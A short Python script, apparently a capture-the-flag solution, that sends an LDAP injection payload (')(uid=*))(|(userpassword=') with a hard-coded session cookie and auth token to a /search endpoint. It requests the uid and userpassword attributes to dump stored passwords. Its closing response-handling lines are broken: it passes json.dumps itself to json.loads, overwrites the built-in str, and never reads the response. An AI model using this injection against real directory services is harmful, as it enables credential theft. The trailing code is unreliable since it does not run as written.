import requests

cookies = {
    'SESSION': 'XG6gliD1ccy5x4G3a4v4',
}

headers = {
    'Host': '10.142.0.6',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'http://10.142.0.6/home.html',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'np-auth': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTAxLTAyIDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.12CMnH99Zyn7VvPS0LTORE88uhdeOQoocS5fzkpBc+s',
    'X-Requested-With': 'XMLHttpRequest',
    'Connection': 'keep-alive',
}

data = [
  ('name', ')(uid=*))(|(userpassword='),
  ('isElf', 'True'),
  ('attributes', 'uid,userpassword'),
]

r = requests.post('http://10.142.0.6/search', headers=headers, cookies=cookies, data=data)
import json
data = json.loads(json.dumps)
str = (data)
#str = json.dumps(data[0])
print str
#print(json.dumps(r.json(), indent=2))
